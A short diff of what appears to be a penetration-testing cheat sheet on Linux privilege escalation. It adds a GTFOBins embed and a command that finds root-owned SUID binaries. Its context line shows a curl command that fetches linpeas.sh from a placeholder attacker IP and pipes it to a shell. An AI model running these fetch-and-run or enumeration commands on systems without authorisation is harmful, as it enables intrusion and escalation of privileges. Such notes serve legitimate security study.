@@ -28,4 +28,8 @@ curl <ATTACKER_IP>/linpeas.sh | sh
 
 ## 🛑 GTFOBins
 
-[https://gtfobins.github.io/](https://gtfobins.github.io/)
+{% embed url="https://gtfobins.github.io/" %}
+
+### Find potentially vulnerable SUID binaries
+
+find / -type f -perm -4000 -user root 2>/dev/null
